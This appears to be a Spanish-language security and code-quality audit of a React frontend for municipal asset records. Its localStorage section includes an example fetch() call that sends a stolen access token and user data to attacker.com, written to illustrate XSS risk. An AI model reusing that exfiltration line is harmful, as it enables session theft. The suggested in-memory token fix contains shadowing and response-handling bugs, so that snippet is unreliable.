# Auditoría Frontend - vg-web-sipreb

**Fecha de Auditoría:** 2026-03-19
**Proyecto:** Sistema Patrimonial de Registro de Bienes (SIPREB)
**Framework:** React 19 + Vite + Tailwind CSS
**Arquitectura:** Feature-based (9 módulos)

---

## 1. DESCRIPCIÓN GENERAL

**vg-web-sipreb** es un frontend React moderno para gestión de activos patrimoniales municipales. Estructura basada en 9 módulos de características (ms-01 hasta ms-09), con routing centralizado y autenticación JWT.

**Stack:**

- React 19.1.1 + React Router v6
- Vite (bundler)
- Tailwind CSS + Headless UI + Heroicons
- Supabase JS (storage + auth alternativa)
- Axios (HTTP client)
- React Hook Form (gestión de formularios)
- SweetAlert2 (modales de confirmación)

**Ambiente:** Dockerizado con nginx (docker/40-runtime-config.sh)

---

## 2. ARQUITECTURA DETECTADA

### 2.1. Estructura por Módulos (Feature-Based)

```
src/
├── modules/                    ← ✅ Bien organizado por features
│   ├── ms-01-dashboard/        Dashboard principal
│   ├── ms-02-authentication/   Autenticación, roles, permisos
│   ├── ms-03-configuration/    Configuración (áreas, cargos, proveedores)
│   ├── ms-04-patrimonio/       Gestión de activos/bienes
│   ├── ms-05-movements/        Movimientos de activos
│   ├── ms-06-inventario/       Inventarios
│   ├── ms-07-mantenimiento/    Mantenimiento de activos
│   ├── ms-08-reportes/         Reportes y análisis
│   └── ms-09-notificaciones/   (Placeholder)
├── shared/                     ✅ Utilidades comunes
│   └── utils/
│       ├── env.js              ← Config multicapa (runtime/build)
│       ├── supabaseClient.js    ← Cliente Supabase
│       ├── supabaseStorage.js   ← Upload de archivos
│       └── municipalityHelper.js, Paginator.jsx, etc.
├── components/                 ✅ Componentes globales
│   └── RoleGuard.jsx           ← Protección por rol
├── hooks/                      ← Custom hooks
├── layouts/
│   └── SidebarLayout.jsx        ← Layout principal
└── App.jsx + main.jsx          ← Entry points
```

**Evaluación:** ✅ Buena separación por características. Cada módulo tiene su estructura interna (components, pages, services, hooks).

**Puntuación Arquitectura:** 7.5/10

---

## 3. ❌ PROBLEMAS CRÍTICOS (P0)

### 3.1. Componentes Monolíticos Masivos

**Severidad:** CRÍTICO
**Impacto:** Performance, mantenibilidad, testing, debugging

**Hallazgos:**

| Componente | Líneas | Riesgo |
|-----------|--------|--------|
| MovementForm.jsx | **2718** | ❌❌❌ Extremadamente grande |
| AssetModal.jsx | **1838** | ❌❌ Muy grande |
| MovementsPage.jsx | **1638** | ❌❌ Muy grande |
| MaintenanceFormModal.jsx | **1611** | ❌❌ Muy grande |
| MovementDetails.jsx | **1503** | ❌❌ Muy grande |
| SupplierModal.jsx | **1237** | ❌ Grande |
| PersonModal.jsx | **1108** | ❌ Grande |

**Problemas específicos (MovementForm.jsx):**

```jsx
// ❌ Antipatrón: Múltiples useState en un solo componente
const [formData, setFormData] = useState(...);      // 1
const [displayAssets, setDisplayAssets] = useState(...);  // 2
const [assetFilterMessage, setAssetFilterMessage] = useState(...);  // 3
const [loading, setLoading] = useState(...);        // 4
const [error, setError] = useState(...);            // 5
const [movements, setMovements] = useState(...);    // 6
const [selectedMovement, setSelectedMovement] = useState(...);  // 7
// ... más estados
```

**Impacto:**

- ❌ Re-renders innecesarios en cambios de estado
- ❌ Difícil de entender (necesitas leer 2718 líneas)
- ❌ Imposible de testear (demasiadas dependencias)
- ❌ Problemático para debugging
- ❌ Difícil de reutilizar lógica
- ❌ Alto riesgo de memory leaks en useEffect

**Remediación:**

Descomponer en sub-componentes:

```
MovementForm/
├── MovementForm.jsx           (100-150 líneas)
├── AssetSelectionStep.jsx     (200 líneas)
├── ResponsibleSelectionStep.jsx (200 líneas)
├── DocumentUploadStep.jsx     (300 líneas)
├── ReviewStep.jsx             (150 líneas)
└── hooks/
    ├── useMovementForm.js     (estado central)
    └── useMovementValidation.js
```

**Prioridad:** INMEDIATA. Estos componentes bloquean el proyecto.

---

### 3.2. Tokens JWT Almacenados en localStorage (Sin Protección XSS)

**Severidad:** CRÍTICO
**Componente:** auth.service.js (línea 12-13)
**Impacto:** Robo de sesión

**Hallazgo:**

```javascript
// ❌ VULNERABLE: localStorage es accesible por XSS
this.token = localStorage.getItem('accessToken');         // Línea 12
this.user = JSON.parse(localStorage.getItem('user') || 'null');  // Línea 13

// ❌ También guarda expiración
const expiresIn = parseInt(localStorage.getItem('expiresIn' || '0');  // Línea 18
```

**Riesgo:**

```javascript
// Un script malicioso en tu sitio puede acceder así:
const accessToken = localStorage.getItem('accessToken');
const userData = localStorage.getItem('user');
// → Enviar a servidor atacante
fetch('https://attacker.com/steal', {
  body: JSON.stringify({ token: accessToken, user: userData })
});
```

**Por qué localStorage es inseguro:**

- ❌ Cualquier script JavaScript en la página puede leer
- ❌ Persiste permanentemente (sin expiración automática)
- ❌ Sin protección HttpOnly

**Remediación en orden de recomendación:**

**Opción 1: Token en Memory + Refresh Token en HttpOnly Cookie (RECOMENDADO)**

```javascript
// Frontend
// Almacenar accessToken EN MEMORIA (se pierde al refresh/cerrar tab)
let accessToken = null;

// Almacenar refreshToken en HttpOnly Cookie (automático, seguro)
// Backend devuelve: Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict

// Al iniciar sesión
async login(email, password) {
  const response = await fetch('/auth/login', { credentials: 'include' });
  const { accessToken } = await response.json();
  accessToken = accessToken;  // En memoria
  // refreshToken llega automático en cookie
}

// Interceptor de Axios
axiosInstance.interceptors.request.use(config => {
  if (accessToken) {
    config.headers.Authorization = `Bearer ${accessToken}`;
  }
  return config;
});

// Al refrescar token
axiosInstance.interceptors.response.use(
  response => response,
  async error => {
    if (error.response?.status === 401) {
      const { data } = await fetch('/auth/refresh', { credentials: 'include' });
      accessToken = data.accessToken;  // Nuevo token en memoria
      return axiosInstance(originalRequest);
    }
  }
);
```

**Opción 2: sessionStorage (Intermedio - Se limpia al cerrar tab)**

```javascript
// Menos seguro que opción 1, pero mejor que localStorage
sessionStorage.setItem('accessToken', token);  // Se borra al cerrar tab
```

**Opción 3: BFF Pattern (Backend for Frontend)**

```
Frontend → BFF (en tu dominio) → Microservicios
           (maneja tokens internamente)
```

**Prioridad:** CRÍTICA - Implementar Opción 1 antes de producción

---

### 3.3. Múltiples Supabase Keys Expuestas en .env.development

**Severidad:** ALTO
**Componente:** .env.development
**Impacto:** Posible acceso a datos en Supabase

**Hallazgo:**

```env
# ❌ EXPUESTO: Anon keys públicas en repositorio
VITE_SUPABASE_URL=https://uannlnmvkwrfpyimaaby.supabase.co
VITE_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOi...

# ❌ MÚLTIPLES INSTANCIAS
VITE_MOVEMENTS_SUPABASE_URL=https://uannlnmvkwrfpyimaaby.supabase.co
VITE_MOVEMENTS_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOi...
```

**Aclaración sobre Anon Keys:**

- ✅ Anon Keys SÍ pueden estar en frontend (son públicas)
- ❌ PERO deben estar protegidas por RLS (Row-Level Security) en Supabase
- ❌ PERO no deberían estar en .env.development en repositorio público

**Verificación necesaria:**

```sql
-- En Supabase SQL Editor:
-- ¿Están habilitadas las políticas RLS?
SELECT schemaname, tablename, rowsecurity
FROM pg_tables
WHERE schemaname NOT IN ('pg_catalog', 'information_schema');

-- Resultado esperado:
-- rowsecurity = true (en todas las tablas sensibles)
```

**Remediación:**

1. Verificar RLS está habilitado en Supabase
2. .gitignore debe ignorar .env.development:

```bash
# .gitignore
.env
.env.development
.env.local
```

1. Usar .env.example para documentar:

```env
# .env.example
VITE_SUPABASE_URL=https://tu-proyecto.supabase.co
VITE_SUPABASE_ANON_KEY=tu-anon-key-aqui
```

1. En CI/CD, inyectar valores desde secrets

**Prioridad:** MEDIA (si RLS está habilitado, bajo riesgo)

---

### 3.4. 1038 Líneas de console.log/warn/error (Spam de Logging)

**Severidad:** ALTO
**Impacto:** Performance, seguridad (exposición de datos)

**Hallazgos:**

```javascript
// ❌ auth.service.js
console.log(`[AUTH] Auto-refresh programado en ${Math.round(refreshInMs / 1000)}s`);  // Línea 36
console.log('[AUTH] Ejecutando auto-refresh de token...');  // Línea 40
console.log('[AUTH] Token renovado automáticamente');  // Línea 42
console.log('[INFO] Token renovado exitosamente');  // Línea 369

// ❌ supabaseStorage.js (con emojis)
console.log('📤 Subiendo archivo:', fileName);
console.log('✅ Archivo subido exitosamente:', data.path);
console.log('🔗 URL pública generada:', publicUrl);

// ❌ Dashboard - EXPOSICIÓN DE DATOS
console.log("id de municipalidad", localStorage.getItem('municipalityId'));  // Expone IDs
console.log("id de usuario", localStorage.getItem('userId'));                // Expone IDs

// ❌ Múltiples páginas con debug
src/modules/ms-02-authentication/components/roles/RolesPageDebug.jsx  // Archivo de DEBUG
```

**Problemas:**

- ❌ **Performance:** Cada console.log cuesta nanosegundos (acumulados)
- ❌ **Privacidad:** Expone IDs, tokens parciales, URLs internas
- ❌ **DevTools abierto:** Usuario puede ver datos sensibles
- ❌ **Mobile:** Más lento en dispositivos con recursos limitados

**Estadísticas:**

- 1038 líneas con console.*/warn/error
- Algunos archivos tienen 20+ logs

**Remediación:**

Crear logger centralizado con niveles:

```javascript
// src/shared/utils/logger.js
const LOG_LEVEL = import.meta.env.MODE === 'production' ? 'ERROR' : 'DEBUG';

const logger = {
  debug: (message, data) => {
    if (LOG_LEVEL === 'DEBUG') console.log(`[DEBUG] ${message}`, data);
  },
  info: (message, data) => {
    if (['DEBUG', 'INFO'].includes(LOG_LEVEL)) console.info(`[INFO] ${message}`, data);
  },
  warn: (message, data) => {
    if (['DEBUG', 'INFO', 'WARN'].includes(LOG_LEVEL)) console.warn(`[WARN] ${message}`, data);
  },
  error: (message, data) => {
    console.error(`[ERROR] ${message}`, data);
    // Enviar a Sentry/Rollbar en producción
  }
};

export default logger;
```

Reemplazar todos los `console.log` con `logger.debug`, etc. Agregar al build process un `eslint-plugin-no-console`.

**Prioridad:** MEDIA (config antes de producción)

---

### 3.5. Manejo de Errores Inconsistente y Genérico

**Severidad:** ALTO
**Componentes:** Todos los servicios (maintenanceService.js, movementDocumentService.js, etc.)
**Impacto:** Debugging imposible

**Ejemplo (maintenanceService.js):**

```javascript
// ❌ Error genérico sin contexto
try {
  const response = await apiClient.get(`/maintenances/${id}`);
  return response.data;
} catch (error) {
  console.error('Error fetching maintenance:', error);  // Demasiado genérico
  throw error;  // Re-lanzar sin información adicional
}

// ❌ En componente
try {
  await maintenanceService.fetchMaintenance(id);
} catch (error) {
  setError('Error al cargar datos');  // Usuario no entiende qué falló
  // No hay retry, no hay logging, no hay análisis
}
```

**Remediación:**

```javascript
// Crear HttpError personalizado
export class HttpError extends Error {
  constructor(status, message, endpoint, originalError) {
    super(message);
    this.status = status;
    this.endpoint = endpoint;
    this.originalError = originalError;
  }
}

// En maintenanceService.js
async getMaintenance(id) {
  try {
    const response = await apiClient.get(`/maintenances/${id}`);
    return response.data;
  } catch (error) {
    const errorMessage = error.response?.data?.message || 'Error desconocido';
    throw new HttpError(
      error.response?.status || 500,
      errorMessage,
      `/maintenances/${id}`,
      error
    );
  }
}

// En componente con retry
const fetchWithRetry = async (fn, retries = 3) => {
  for (let i = 0; i < retries; i++) {
    try {
      return await fn();
    } catch (error) {
      if (i === retries - 1) throw error;
      await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
    }
  }
};
```

**Prioridad:** MEDIA (después de refactoring de componentes grandes)

---

## 4. ⚠️ PROBLEMAS MEDIOS (P1)

### 4.1. Falta de Contratos y Validaciones en JavaScript

**Severidad:** MEDIO
**Impacto:** Bugs en runtime, regresiones silenciosas y refactoring riesgoso

Estado actual: **JavaScript puro (decisión válida)**

Problemas detectados:

- ❌ No hay contratos de datos explícitos entre servicios y componentes
- ❌ No hay validación sistemática de payloads de entrada/salida
- ❌ Props y funciones críticas sin documentación de estructura esperada
- ❌ Errores de shape de datos se detectan tarde (solo en ejecución)

Recomendación: **Fortalecer JavaScript sin cambiar de stack**

```javascript
// 1) JSDoc en servicios críticos
/**
 * @param {{ id: string, status: string }} maintenance
 * @returns {{ id: string, status: string, updatedAt: string }}
 */
export function normalizeMaintenance(maintenance) {
  return {
    id: maintenance.id,
    status: maintenance.status,
    updatedAt: new Date().toISOString()
  };
}
```

```javascript
// 2) PropTypes en componentes reutilizables
import PropTypes from 'prop-types';

AssetCard.propTypes = {
  asset: PropTypes.shape({
    id: PropTypes.string.isRequired,
    code: PropTypes.string.isRequired,
    status: PropTypes.string.isRequired
  }).isRequired,
  onSelect: PropTypes.func.isRequired
};
```

```javascript
// 3) Validación de payloads (zod o yup) antes de procesar API data
import { z } from 'zod';

const movementSchema = z.object({
  id: z.string(),
  movementType: z.string(),
  date: z.string()
});

const parsed = movementSchema.safeParse(response.data);
if (!parsed.success) {
  throw new Error('Payload inválido en movement API');
}
```

---

### 4.2. Ausencia de React.memo, useMemo, useCallback (Performance)

**Severidad:** MEDIO
**Componentes:** Todos (especialmente modales largos)

**Problema:**

```jsx
// ❌ Sin optimización
export default function AssetModal({ isOpen, onClose, onSuccess, bien = null }) {
  const [formData, setFormData] = useState(...);

  // Sin React.memo → RE-RENDERIZA todo cuando parent re-renderiza
  return (
    <Modal isOpen={isOpen} onClose={onClose}>
      {/* 1838 líneas de JSX */}
    </Modal>
  );
}

// ❌ Sin useMemo para datos calculados
const filteredAssets = assets.filter(a => a.status === 'DISPONIBLE');  // En cada render
```

**Remediación:**

```jsx
// ✅ Con React.memo
const AssetModalContent = React.memo(
  ({ formData, onChange }) => (
    <Modal>
      {/* Contenido */}
    </Modal>
  )
);

// ✅ Con useMemo
const filteredAssets = useMemo(() =>
  assets.filter(a => a.status === 'DISPONIBLE'),
  [assets]
);

// ✅ Con useCallback
const handleChange = useCallback((field, value) => {
  setFormData(prev => ({ ...prev, [field]: value }));
}, []);
```

**Prioridad:** MEDIA (después de refactoring de componentes)

---

### 4.3. Servicios Muy Grandes (250-438 líneas)

**Severidad:** MEDIO

| Servicio | Líneas | Métodos |
|----------|--------|---------|
| maintenanceService.js | 438 | ~8 métodos |
| movementDocumentService.js | 401 | ~6 métodos |
| inventoryApi.js | 307 | ~7 métodos |

**Problema:** Múltiples responsabilidades en un solo archivo

**Remediación:** Dividir por dominio:

```
services/
├── maintenanceService.js (API calls)
├── maintenanceValidator.js (business logic)
├── maintenanceFormatter.js (data transformation)
└── maintenanceStorage.js (localStorage)
```

**Prioridad:** MEDIA

---

### 4.4. Logging Verboso en Console (Exposición de Datos Sensibles)

**Hallazgo en dashboard/pages/index.jsx:**

```javascript
// ❌ EXPONE datos del usuario en console
console.log("id de municipalidad", localStorage.getItem('municipalityId'));
console.log("id de usuario", localStorage.getItem('userId'));
```

**Riesgo:** Usuario abre DevTools y ve sus IDs

**Prioridad:** MEDIA (junto con limpieza de console)

---

## 5. 🧹 PROBLEMAS DE LIMPIEZA

### 5.1. Archivo de Debug Dangling (RolesPageDebug.jsx)

**Severidad:** BAJA
**Componente:** `src/modules/ms-02-authentication/components/roles/RolesPageDebug.jsx`

Este archivo debería estar:

- ❌ Removido (si no se usa)
- ❌ Movido a `.github/debugging/` (si es referencia)
- ❌ Mergeado en RolesPage.jsx (si es versión en desarrollo)

**Acción:** Review y remover o documentar.

---

### 5.2. Código Comentado

**Ejemplo (MovementForm.jsx):**

```javascript
// comentedOutCode.forEach(line => {
//   console.log(line);
// });

// const oldFormData = {
//   ...
// };
```

**Acción:** Remover código comentado. Git mantiene historia.

---

## 6. ✅ BUENAS PRÁCTICAS DETECTADAS

### 6.1. Arquitectura Modular por Características

✅ Cada módulo autónomo (components, services, hooks, pages)

### 6.2. Protección de Rutas con RoleGuard

✅ RoleGuard bien implementado (línea 12-63 en RoleGuard.jsx)

```jsx
const RoleGuard = ({ allowedRoles = [], children }) => {
  const { user } = useAuth();
  const userRoles = user?.roles || [];

  // SUPER_ADMIN siempre pasa
  if (userRoles.includes('SUPER_ADMIN')) {
    return children;
  }

  const hasAccess = allowedRoles.some(role => userRoles.includes(role));
  if (!hasAccess) {
    return <AccessDeniedUI />;
  }

  return children;
};
```

### 6.3. Custom Hooks Reutilizables

✅ `useAuth`, `usePermissions`, `useProtectedRoute`, `usePagination`

### 6.4. Configuración Multicapa (env.js)

✅ Runtime config + Build config + Fallback

```javascript
export function getEnv(key, fallback = '') {
  const runtimeValue = runtimeConfig[key];  // Docker runtime
  if (runtimeValue !== undefined) return runtimeValue;

  const buildValue = buildConfig[key];      // Build time
  if (buildValue !== undefined) return buildValue;

  return fallback;
}
```

### 6.5. Validación de Archivos en Upload

✅ `validateFile()` en uploadService.js

### 6.6. React Router v6 Moderno

✅ Usando `<Routes>`, `<Route>`, `useNavigate`, `useParams`

### 6.7. Form Handling con react-hook-form

✅ Usado en ModalsNavigationMenu

### 6.8. Tailwind CSS + Headless UI

✅ UI consistente, componentes accesibles

---

## 7. 📊 EVALUACIÓN POR DIMENSIÓN

| Dimensión | Score | Nota |
|-----------|-------|------|
| **Arquitectura** | 7.5/10 | ✅ Buena separación modular, ❌ componentes monolíticos |
| **React Patterns** | 5.0/10 | ❌ Componentes grandes, sin optimización, mucho estado local |
| **Gestión de Estado** | 6.0/10 | ✅ Context API bien, ❌ sin Redux/Zustand para global |
| **Consumo de APIs** | 6.5/10 | ✅ Servicios centralizados, ❌ error handling débil |
| **Seguridad** | 4.5/10 | ❌ Tokens en localStorage, ❌ console logs sensibles |
| **Performance** | 5.5/10 | ❌ Sin React.memo, ❌ sin useMemo, ❌ 1000+ console.log |
| **Limpieza de Código** | 6.0/10 | ⚠️ 1038 líneas console, ❌ código comentado, ❌ archivos debug |
| **Testing** | 3.0/10 | ❌ No hay evidencia de tests unitarios |
| **Documentación** | 5.0/10 | ⚠️ Algunos archivos con comentarios, ❌ sin JSDoc |
| **DevOps/Config** | 7.0/10 | ✅ Dockerfile + nginx, ✅ runtime config, ❌ .env.development expuesto |

---

## 8. 🎯 RECOMENDACIONES CONCRETAS

### Roadmap de Remediación

**INMEDIATA (1-2 semanas):**

1. ❌ Refactorizar MovementForm.jsx (2718→600 líneas) → Descomponer
2. ❌ Remover tokens de localStorage → Implementar memory + httpOnly cookies
3. ❌ Limpiar todos los console.log → 50 líneas máximo
4. ❌ Remover archivo RolesPageDebug.jsx

**CORTO PLAZO (3-4 semanas):**
5. ❌ Refactorizar AssetModal.jsx (1838→400 líneas)
6. ❌ Mejorar manejo de errores → HttpError personalizado
7. ❌ Agregar React.memo en componentes pesados
8. ❌ Dividir servicios grandes (maintenanceService → 4 archivos)

**MEDIANO PLAZO (1-2 meses):**
9. ❌ Estandarizar contratos JavaScript (JSDoc + PropTypes + validación zod/yup)
10. ❌ Agregar tests unitarios (Jest + React Testing Library)
11. ❌ Implementar Sentry para error tracking
12. ❌ ESLint rules para prevenir console.log

---

## 9. PUNTUACIÓN FINAL

**Estado General:** 🔴 **REGULAR** (5.8/10)

| Aspecto | Puntuación |
|---------|-----------|
| **Seguridad** | 4.5/10 ❌ |
| **Arquitectura** | 7.5/10 ✅ |
| **Performance** | 5.5/10 ⚠️ |
| **Código Limpio** | 6.0/10 ⚠️ |
| **Mantenibilidad** | 5.0/10 ❌ |
| **DevOps** | 7.0/10 ✅ |

**Promedio:** **5.8/10**

---

## 10. RESUMEN EJECUTIVO

| Criterio | Hallazgo |
|----------|----------|
| **¿LISTO PARA PRODUCCIÓN?** | 🔴 NO |
| **Bloqueadores** | Componentes >1000 líneas, tokens en localStorage |
| **Tiempo Remediación** | 4-6 semanas (equipo de 2-3 devs) |
| **Prioritarios** | 1, 2, 3 (arquitectura + seguridad) |
| **Nice-to-Have** | Tests, Sentry y monitoreo de errores |

**Implementación recomendada crítica:** Opción 1 (Memory tokens + HttpOnly cookies) antes de producción.

---

## 11. 📋 INVENTARIO COMPLETO DE ERRORES Y HALLAZGOS NEGATIVOS

Este anexo enumera **25/25 hallazgos negativos** detectados en la auditoría.

| ID | Severidad | Módulo | Hallazgo negativo |
|----|-----------|--------|-------------------|
| FE-001 | CRITICAL | ms-05-movements | `MovementForm.jsx` tiene 2718 líneas y concentra demasiadas responsabilidades. |
| FE-002 | CRITICAL | ms-04-patrimonio | `AssetModal.jsx` tiene 1838 líneas y mezcla UI, estado y lógica de negocio. |
| FE-003 | CRITICAL | ms-05-movements | `MovementsPage.jsx` tiene 1638 líneas con responsabilidades múltiples no separadas. |
| FE-004 | CRITICAL | ms-07-mantenimiento | `MaintenanceFormModal.jsx` tiene 1611 líneas y duplica patrones de otros formularios masivos. |
| FE-005 | CRITICAL | ms-05-movements | `MovementDetails.jsx` tiene 1503 líneas y requiere partición por secciones funcionales. |
| FE-006 | CRITICAL | ms-02-authentication | `accessToken` se almacena en `localStorage` sin protección frente a XSS. |
| FE-007 | CRITICAL | shared/auth | Objeto `user` completo en `localStorage` sin control de exposición. |
| FE-008 | HIGH | shared/logging | Se detectaron 1038 líneas de `console.log/warn/error`, con ruido y posible exposición de datos. |
| FE-009 | HIGH | ms-01-dashboard | Logs en dashboard exponen `municipalityId` y `userId` en consola. |
| FE-010 | MEDIUM | shared/config | Variables de Supabase en `.env.development` dentro del repositorio; requiere control estricto de RLS y secretos. |
| FE-011 | MEDIUM | ms-07-mantenimiento | `maintenanceService.js` (438 líneas) mezcla acceso a API, transformación y reglas. |
| FE-012 | MEDIUM | ms-05-movements | `movementDocumentService.js` (401 líneas) mezcla almacenamiento, conversión y validación. |
| FE-013 | MEDIUM | ms-06-inventario | `inventoryApi.js` (307 líneas) combina CRUD y formateo en un único archivo. |
| FE-014 | HIGH | ms-04/ms-05/ms-07 | Ausencia de `React.memo`, `useMemo`, `useCallback` en componentes pesados. |
| FE-015 | LOW | ms-02-authentication | Existe `RolesPageDebug.jsx` sin propósito claro en flujo productivo. |
| FE-016 | LOW | varios | Se encontró código comentado residual que ensucia mantenimiento y revisión. |
| FE-017 | MEDIUM | ms-07-mantenimiento | Manejo de errores inconsistente; se relanza error sin contexto operativo. |
| FE-018 | HIGH | ms-02-authentication | `expiresIn` persistido en `localStorage` y susceptible a manipulación cliente. |
| FE-019 | MEDIUM | commons/testing | No hay evidencia sólida de pruebas unitarias/componentes para rutas críticas. |
| FE-020 | MEDIUM | commons/javascript | JavaScript sin contratos formales (JSDoc/PropTypes/validación de payloads) en puntos críticos. |
| FE-021 | LOW | shared/logging | Uso de emojis en logging técnico (`📤`, `✅`, `🔗`) no apto para producción. |
| FE-022 | LOW | ms-05/shared | Importaciones repetidas de Supabase pueden crecer en deuda de bundle y consistencia. |
| FE-023 | MEDIUM | shared/services | Servicios acoplados por instanciación directa sin estrategia clara de desacoplamiento. |
| FE-024 | MEDIUM | ms-01-tenant-management | Inconsistencia entre URLs hardcodeadas y uso de `getEnv()` en consumo de APIs. |
| FE-025 | HIGH | shared/http-client | Axios sin interceptor global consistente para 401/403/500 y refresh token. |

---

**Auditoría completada por:** Senior Frontend Architect
**Metodología:** Análisis estático + evaluación de patrones React
